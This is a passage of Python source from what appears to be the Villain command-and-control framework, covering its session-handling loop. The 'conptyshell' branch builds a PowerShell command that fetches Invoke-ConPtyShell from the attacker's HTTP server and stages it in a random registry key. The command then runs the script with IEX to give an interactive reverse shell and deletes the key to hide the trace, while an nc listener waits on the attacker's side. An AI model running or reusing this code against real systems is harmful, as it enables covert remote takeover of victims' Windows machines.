						# Reset prompt if session status is Undefined or Lost 
						if Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:
							Main_prompt.ready = True

					else:
						print(sessions_check[1])
						Main_prompt.ready = True



				elif cmd == 'conptyshell':
					
					lhost = parse_lhost(cmd_list[1])
					try: lport = int(cmd_list[2])
					except: lport = -1					
					session_id = cmd_list[3]
					sessions_check = Sessions_Manager.sessions_check(session_id)
					
					if sessions_check[0]:
						
						# Parse LHOST
						if not lhost:
							print(f'\r[{ERR}] Failed to parse LHOST value.')
							continue
						
						# Parse LPORT					
						if not (lport >= 1 and lport <= 65535):
							print(f'\r[{ERR}] Failed to parse LPORT value.')
							continue

						# Check if shell type is compatible
						shell_type = Sessions_Manager.active_sessions[session_id]['Shell']

						if shell_type not in ['powershell.exe']:
							print(f'\r[{ERR}] Operation not supported for this shell type.')
							continue

						# Check who is the owner of the shell session
						session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')

						# Prepare ConPtyShell
						if not os.path.isfile(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1'):							
							print(f'\r[{ERR}] Invoke-ConPtyShell.ps1 not found.')
							continue
						
						script_data = get_file_contents(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1', mode = 'r')
						func_name = value_name = get_random_str(10)
						script_data = script_data.replace('*LHOST*', lhost).replace('*LPORT*', str(lport)).replace('*FUNC*', func_name)

						# Create ticket for http smuggling
						ticket = str(uuid4())
						File_Smuggler.file_transfer_tickets[ticket] = {'data' : script_data, 'issuer' : 'self', 'lifespan' : 1, 'reset_prompt' : False}

						# The script constructed below requests and stores ConPtyShell in registry. 
						# It then loads the script twice for the following reasons:
						#    1) Check if it's loading properly before running it as a new process
					    #       because if it was run as a new process immediately and something
						#       went wrong, the user would not receive stderr.
						#    2) Run as a new process, given that the first pre-flight check didn't error out.

						# Construct Villain issued command to request and exec ConPtyShell
						rand_key = get_random_str(5)
						value_name = get_random_str(5)
						script_src = f'http://{lhost}:{File_Smuggler_Settings.bind_port}/{ticket}'
						reg_polution = f'New-Item -Path "HKCU:\SOFTWARE\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\SOFTWARE\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
						exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\SOFTWARE\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
						remove_src = f'Remove-Item -Path "HKCU:\Software\{rand_key}" -Recurse'
						new_proc = Exec_Utils.new_process_wrapper(f"{exec_script}; {func_name}; {remove_src}", session_id)
						execution_object = Exec_Utils.ps_try_catch_wrapper(f'{reg_polution};{exec_script};({new_proc})', error_action = remove_src)
						
						#print(execution_object)

						villain_cmd = {
							'data' : execution_object,
							'quiet' : False
						}

						# Append script for execution
						if session_owner_id == core.return_server_uniq_id():

							villain_cmd['issuer'] = 'self'

							# Start listener
							os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
							sleep(0.2)
							Hoaxshell.command_pool[session_id].append(villain_cmd)

						else:
							verified = input(f'\r[{WARN}] This session belongs to a sibling server. If the victim host cannot directly reach your host, this operation will fail. Proceed? [y/n]: ')
							
							if verified.lower().strip() in ['y', 'yes']:
								# Start listener
								os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
								villain_cmd['issuer'] = core.return_server_uniq_id()
								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, villain_cmd)
										
					else:
						print(sessions_check[1])

						

				elif cmd == 'cmdinspector':

					option = cmd_list[1].lower()

					if option in ['on', 'off']:

						if option == 'off':
							Session_Defender.is_active = False

						elif option == 'on':
							Session_Defender.is_active = True
						
						print(f'Session Defender is turned {option}.')

					else:
						print('Value can be on or off.')


				else:
					continue
		
		
		except KeyboardInterrupt:
			
			bound = False
			Main_prompt.ready = True
			
			if Main_prompt.exec_active:
				Main_prompt.exec_active = False
				print('\r')
				continue
			
			verified = True
			
			if Sessions_Manager.active_sessions or core.sibling_servers:
				bound = True
				choice = input('\nAre you sure you wish to exit? All of your sessions/connections with siblings will be lost [yes/no]: ').lower().strip()
				verified = True if choice in ['yes', 'y'] else False
										
			if verified:				
				
				try:
					Core_Server.announce_server_shutdown()			
					Hoaxshell.terminate()				
					core.stop_listener()

				except Exception as e:
					pass

				finally:
					print() if bound else print('\n')
					print_meta()
					sys.exit(0)


if __name__ == '__main__':
	main()
